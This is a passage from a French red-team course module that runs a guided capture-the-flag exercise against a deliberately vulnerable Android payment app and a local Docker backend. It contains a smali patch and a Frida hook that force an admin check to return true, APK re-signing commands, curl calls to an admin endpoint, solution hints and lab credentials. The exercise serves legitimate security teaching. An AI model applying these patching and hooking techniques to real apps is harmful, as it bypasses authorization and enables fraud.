#     invoke-interface {v0, v1, v2}, ...
#     move-result-object v1
#     const-string v0, "admin"
#     invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
#     move-result v0
#     return v0
# .end method

# Étape 4 : PATCHER — Remplacer la méthode isAdmin() pour qu'elle retourne toujours TRUE
```

**Contenu du patch smali (remplacement de la méthode isAdmin) :**

```smali
# T1574.010 — PATCH SMALI : isAdmin() retourne toujours TRUE
# Fichier : payvault_unpacked/smali/com/payvault/auth/SessionManager.smali
# Remplacer la méthode isAdmin() par :

.method public isAdmin()Z
    .locals 1

    const/4 v0, 0x1        # v0 = TRUE (1)

    return v0
.end method
```

#### 3.5.4 Méthode alternative — Modification via Frida

```javascript
// T1574.010 — Alternative au patching : hook Frida pour surcharger isAdmin()

Java.perform(function() {
    var SessionManager = Java.use('com.payvault.auth.SessionManager');
    
    SessionManager.isAdmin.implementation = function() {
        console.log("[+] isAdmin() hooké — retourne TRUE");
        return true;
    };
    
    SessionManager.getRole.implementation = function() {
        console.log("[+] getRole() hooké — retourne 'admin'");
        return "admin";
    };
});
```

#### 3.5.5 Recompilation et signature de l'APK patché

```bash
# T1574.010 — Recompilation et signature

# Étape 1 : Recompiler l'APK
apktool b payvault_unpacked -o PayVault_patched_unsigned.apk
echo "[+] APK recompilé : PayVault_patched_unsigned.apk"

# Étape 2 : Générer une clé de signature (si pas déjà fait)
keytool -genkey -v \
    -keystore payvault_debug.keystore \
    -alias payvault_debug \
    -keyalg RSA \
    -keysize 2048 \
    -validity 36500 \
    -storepass android \
    -keypass android \
    -dname "CN=PayVault Debug, OU=RedTeam, O=SDV, L=Paris, ST=IDF, C=FR"

# Étape 3 : Aligner l'APK (zipalign)
zipalign -v -p 4 PayVault_patched_unsigned.apk PayVault_patched_aligned.apk

# Étape 4 : Signer l'APK avec apksigner (recommandé, plus moderne que jarsigner)
apksigner sign \
    --ks payvault_debug.keystore \
    --ks-key-alias payvault_debug \
    --ks-pass pass:android \
    --key-pass pass:android \
    --out PayVault_patched_signed.apk \
    PayVault_patched_aligned.apk

echo "[+] APK signé : PayVault_patched_signed.apk"

# Alternative avec jarsigner
# jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
#     -keystore payvault_debug.keystore \
#     -storepass android -keypass android \
#     PayVault_patched_aligned.apk payvault_debug

# Étape 5 : Vérifier la signature
apksigner verify --verbose PayVault_patched_signed.apk
echo "[+] Signature vérifiée avec succès"

# Étape 6 : Installer l'APK patché sur l'émulateur
adb install -r PayVault_patched_signed.apk
echo "[+] APK patché installé sur l'émulateur"

# Étape finale : Lancer l'application et accéder au panneau admin
# Normalement, les fonctionnalités admin sont maintenant débloquées
```

#### 3.5.6 Accès à l'endpoint admin

```bash
# Exploiter l'APK patché pour obtenir le Flag 5

# L'application patchée expose maintenant l'option "Administration"
# On peut aussi appeler l'endpoint directement :

# Endpoint admin (découvert dans l'étape Flag 4)
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq -r '.token')

# Appeler l'endpoint admin (le serveur vérifie le rôle dans le JWT)
# Mais l'APK patché peut avoir modifié d'autres comportements
curl -s http://localhost:9090/api/v1/admin/stats \
    -H "Authorization: Bearer $TOKEN" \
    -H "X-Admin-Token: true" | jq .

# Si l'APK ne suffit pas, on peut potentiellement forger un JWT admin
# après avoir découvert la clé secrète dans l'APK (Flag 1)
```

#### 3.5.7 Indices disponibles

| Niveau | Indice |
|--------|--------|
| Léger (+1 min) | La classe SessionManager dans le code décompilé contient la logique d'admin |
| Moyen (+3 min) | Utilisez apktool pour décompiler, puis modifiez la méthode isAdmin() en smali |
| Complet (+5 min) | La méthode isAdmin() doit retourner `const/4 v0, 0x1` puis `return v0` |

---

## 4. Structure du déroulé

### 4.1 Timeline détaillée

```
┌───────────────────────────────────────────────────────────────────────┐
│              DÉROULÉ DE L'OPÉRATION "PAYVAULT" (1h30)                 │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  PHASE 0 — SETUP & BRIEFING (5 min)                                   │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ • Distribution de l'APK (USB, partage réseau, lien)              │ │
│  │ • Vérification que l'émulateur Android fonctionne                │ │
│  │ • Vérification que le backend Docker est accessible (localhost)  │ │
│  │ • Rappel des règles ROE                                          │ │
│  │ • Distribution de la fiche de documentation (template)           │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 1 — FLAG 1 (10 min)                                            │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ Objectif : Credentials hardcodés dans l'APK                      │ │
│  │ Tâches   :                                                       │ │
│  │  1. Décompiler l'APK avec jadx-gui ou apktool                    │ │
│  │  2. Parcourir les fichiers de configuration                      │ │
│  │  3. Identifier les credentials dans strings.xml ou Config.java   │ │
│  │  4. Tester l'authentification sur l'API                          │ │
│  │  5. Documenter le flag et la technique MITRE                     │ │
│  │                                                                  │ │
│  │ ⏱️ Durée indicative : 10 min (facile)                            │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 2 — FLAG 2 (15 min)                                            │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ Objectif : Bypass SSL Pinning + interception réseau              │ │
│  │ Tâches   :                                                       │ │
│  │  1. Configurer Burp Suite en proxy d'interception                │ │
│  │  2. Installer le certificat Burp sur l'émulateur (ou appareil)   │ │
│  │  3. Configurer le proxy Wi-Fi de l'émulateur vers Burp           │ │
│  │  4. Constater l'échec SSL (SSL Pinning)                          │ │
│  │  5. Lancer Frida avec le script ssl_bypass.js                    │ │
│  │  6. Intercepter le trafic API authentifié                        │ │
│  │  7. Identifier le flag dans une réponse API                      │ │
│  │  8. Documenter le flag et la technique MITRE                     │ │
│  │                                                                  │ │
│  │ ⏱️ Durée indicative : 15 min (moyen)                             │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 3 — FLAG 3 (15 min)                                            │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ Objectif : IDOR sur l'API utilisateur                            │ │
│  │ Tâches   :                                                       │ │
│  │  1. Explorer les endpoints API interceptés                       │ │
│  │  2. Identifier les endpoints prenant un ID utilisateur           │ │
│  │  3. Tester l'accès aux IDs 2, 3, 4...                           │ │
│  │  4. Automatiser avec Burp Intruder ou un script bash             │ │
│  │  5. Trouver le flag dans les données d'un autre utilisateur      │ │
│  │  6. Documenter le flag et la technique MITRE                     │ │
│  │                                                                  │ │
│  │ ⏱️ Durée indicative : 15 min (intermédiaire)                     │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 4 — FLAG 4 (25 min)                                            │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ Objectif : SQL Injection sur le backend                          │ │
│  │ Tâches   :                                                       │ │
│  │  1. Rechercher des endpoints cachés dans le code décompilé       │ │
│  │  2. Tester le paramètre de recherche pour SQLi                   │ │
│  │  3. Identifier le type de SGBD (PostgreSQL)                      │ │
│  │  4. Construire la requête UNION SELECT                           │ │
│  │  5. Énumérer les tables (information_schema)                     │ │
│  │  6. Extraire les flags de la table flags                         │ │
│  │  7. Option : utiliser sqlmap pour automatiser                    │ │
│  │  8. Documenter le flag et la technique MITRE                     │ │
│  │                                                                  │ │
│  │ ⏱️ Durée indicative : 25 min (avancé)                            │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 5 — FLAG 5 (15 min)                                            │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ Objectif : Patcher l'APK pour devenir admin                      │ │
│  │ Tâches   :                                                       │ │
│  │  1. Repérer la classe SessionManager dans jadx                   │ │
│  │  2. Comprendre la logique isAdmin()                              │ │
│  │  3. Décompiler avec apktool pour accéder au smali                │ │
│  │  4. Modifier isAdmin() pour retourner TRUE                       │ │
│  │  5. Recompiler et signer l'APK                                   │ │
│  │  6. Installer l'APK patché                                       │ │
│  │  7. Accéder au panneau admin ou endpoint admin                   │ │
│  │  8. Documenter le flag et la technique MITRE                     │ │
│  │                                                                  │ │
│  │ ⏱️ Durée indicative : 15 min (expert)                            │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│  PHASE 6 — RENDU FINAL (5 min)                                        │
│  ┌──────────────────────────────────────────────────────────────────┐ │
│  │ • Soumission des flags au formateur                              │ │
│  │ • Vérification de la documentation                               │ │
│  │ • Sauvegarde des preuves (screenshots, scripts)                  │ │
│  │ • Retour d'expérience rapide                                     │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 4.2 Rôle du formateur

Pendant le CTF, le formateur :

1. **Circule** entre les apprenants pour débloquer les situations
2. **Distribue les indices** (avec malus temps) sur demande
3. **Surveille** que personne ne bloque plus de 10 minutes sur un flag
4. **Relance** les apprenants en difficulté vers le prochain flag
5. **Vérifie** les flags soumis en temps réel
6. **Note** les techniques utilisées pour le débrief (Module 15)

### 4.3 Conseils pour réussir

```
┌──────────────────────────────────────────────────────────────────┐
│            CONSEILS POUR L'OPÉRATION "PAYVAULT"                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. DOCUMENTEZ EN CONTINU                                         │
│     Prenez des notes IMMÉDIATEMENT après chaque découverte.       │
│     Copiez les commandes exactes utilisées.                      │
│                                                                  │
│  2. LES FLAGS 1-2-3 SONT INDÉPENDANTS                            │
│     Si vous bloquez sur un flag, passez au suivant.               │
│     Le Flag 3 ne nécessite PAS le Flag 2 (vous connaissez l'URL) │ │
│                                                                  │
│  3. GARDER LE TOKEN JWT                                          │
│     Une fois authentifié (Flag 1), conservez le token JWT.        │
│     Il sera utile pour les Flags 3 et 4.                         │
│                                                                  │
│  4. LE CODE DÉCOMPILÉ EST VOTRE MEILLEUR ALLIÉ                    │
│     jadx-gui révèle les endpoints cachés, la logique métier,      │
│     et les faiblesses de conception.                              │
│                                                                  │
│  5. TESTEZ D'ABORD EN LOCAL                                       │
│     Avant de lancer une attaque massive (sqlmap, Intruder),       │
│     testez manuellement pour confirmer la vulnérabilité.          │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 5. Template de documentation

### 5.1 Format de rapport attendu

Chaque apprenant doit remplir le template suivant pour chaque flag soumis :

```markdown
# Documentation Flag X — Opération PayVault

## Informations générales

| Champ | Valeur |
|-------|--------|
| Flag ID | FLAG{...} |
| Technique(s) MITRE | TXXXX (Technique name) |
| Difficulté | ★☆☆☆☆ à ★★★★★ |
| Temps passé | XX minutes |
| Outils utilisés | Liste des outils |

## Méthodologie

### Étape 1 : Reconnaissance
[Décrire comment l'objectif a été identifié]

### Étape 2 : Exploitation
[Commandes exactes utilisées, avec explications]

```bash
# Commande 1
commande --option args

# Résultat obtenu
```

### Étape 3 : Obtention du Flag
[Comment le flag a été découvert et extrait]

## Impact Business

[Dans un contexte réel, ce que cette vulnérabilité permettrait à un attaquant]

## Remédiation proposée

[Comment corriger cette vulnérabilité]

## Preuves

- [ ] Capture d'écran du flag obtenu
- [ ] Logs des commandes exécutées
- [ ] Mapping MITRE ATT&CK complet
```

### 5.2 Tableau de synthèse ATT&CK (à compléter)

À la fin du CTF, remplir ce tableau récapitulatif :

| Flag | Technique MITRE | ID | Phase | Outils | Temps |
|------|----------------|-----|-------|--------|-------|
| 1 | Credentials in Files | T1552.001 | Credential Access | | |
| 2 | SSL Pinning Bypass | T1643 | Defense Evasion | | |
| 2 | Network Sniffing | T1040 | Discovery | | |
| 3 | Insecure Direct Object Reference | T1548 | Privilege Escalation | | |
| 4 | SQL Injection | T1190 | Initial Access | | |
| 5 | App Modification (Smali Patching) | T1574.010 | Persistence | | |

---

## Annexe — Setup de l'environnement CTF (pour le formateur)

### A.1 Infrastructure Docker du backend

```yaml
# docker-compose.yml — Backend PayVault
version: '3.8'
services:
  payvault-api:
    build: ./backend
    ports:
      - "9090:9090"
    environment:
      - DB_HOST=postgres
      - DB_NAME=payvault
      - DB_USER=payvault
      - DB_PASS=payvault_secret
      - JWT_SECRET=PAYVAULT_JWT_SECRET_2024
    depends_on:
      - postgres

  postgres:
    image: postgres:15
    environment:
      - POSTGRES_DB=payvault
      - POSTGRES_USER=payvault
      - POSTGRES_PASSWORD=payvault_secret
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    ports:
      - "5432:5432"
```

```bash
# Commandes de gestion du CTF
# Lancer l'environnement
docker-compose up -d

# Vérifier que le backend répond
curl http://localhost:9090/api/v1/health
# {"status": "ok", "version": "2.1.3"}

# Réinitialiser l'environnement (reset complet)
docker-compose down -v && docker-compose up -d

# Vérifier les logs en temps réel
docker-compose logs -f payvault-api
```

### A.2 Setup de l'émulateur Android

```bash
# Créer un émulateur pour le CTF
avdmanager create avd -n payvault_ctf -k "system-images;android-33;google_apis;x86_64" -d pixel_6

# Lancer avec writable system (nécessaire pour pousser le certificat Burp)
emulator -avd payvault_ctf -writable-system -no-snapshot

# Installer l'APK cible
adb install PayVault_v2.1.3.apk

# Installer Frida server
adb push frida-server-16.x.x-android-x86_64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server-16.x.x-android-x86_64"

# Vérifier la connectivité
adb shell "ping -c 1 localhost"
```

### A.3 Troubleshooting fréquent

```bash
# Problème : Frida ne détecte pas l'application
# → Vérifier que frida-server tourne
adb shell "ps -A | grep frida"
# → Relancer frida-server si nécessaire
adb shell "su -c '/data/local/tmp/frida-server &'"

# Problème : Burp n'intercepte pas le trafic
# → Vérifier le proxy
adb shell settings get global http_proxy
# → Forcer le proxy
adb shell settings put global http_proxy 192.168.56.1:8080
# → Vérifier que Burp écoute sur toutes les interfaces (pas 127.0.0.1)

# Problème : apktool b échoue (erreurs de ressources)
# → Utiliser l'option -f (force)
apktool d PayVault_v2.1.3.apk -o patched -f
# → Supprimer le dossier et recommencer
rm -rf patched
apktool d PayVault_v2.1.3.apk -o patched

# Problème : L'APK signé ne s'installe pas
# → Vérifier la signature existante
apksigner verify --verbose PayVault_v2.1.3.apk
# → Désinstaller TOUTES les versions avant
adb uninstall com.payvault.app
adb shell pm uninstall --user 0 com.payvault.app

# Problème : sqlmap ne détecte pas l'injection
# → Vérifier que le token JWT est valide
curl -s http://localhost:9090/api/v1/users/me \
    -H "Authorization: Bearer $TOKEN" | jq .
# → Régénérer le token si expiré
# → Vérifier que le backend est accessible
curl -s http://localhost:9090/api/v1/health
```

### A.4 Checklist pré-CTF (formateur)

```markdown
## Checklist formateur — Avant le CTF

### Infrastructure
- [ ] Docker backend démarré et répond sur localhost:9090
- [ ] Base de données initialisée (flags présents)
- [ ] Endpoints API fonctionnels (/api/v1/health OK)

### APK
- [ ] APK distribué aux apprenants (USB, lien, partage réseau)
- [ ] APK correspond à la version du backend
- [ ] Credentials hardcodés présents dans l'APK (vérifier avec jadx)

### Émulateur / Appareil
- [ ] Émulateur Android fonctionnel
- [ ] ADB connecté
- [ ] Frida-server installé et fonctionnel
- [ ] Certificat Burp installé comme CA système

### Outils attaquant
- [ ] Burp Suite configuré (proxy sur 0.0.0.0:8080)
- [ ] jadx-gui installé
- [ ] apktool, zipalign, apksigner disponibles
- [ ] sqlmap installé
- [ ] Python3 avec PyJWT disponible

### Documentation
- [ ] Templates de documentation imprimés ou accessibles
- [ ] Rappel des règles ROE affiché
- [ ] Fiche d'indices prête (coûts en temps)
```

---

**Fin du Module 14 — Synthèse & CTF Encadré : Opération "PayVault"**

*Document rédigé pour le cursus M2 Red Team — SDV 2026*
*Scénario CTF conçu à des fins pédagogiques uniquement.*
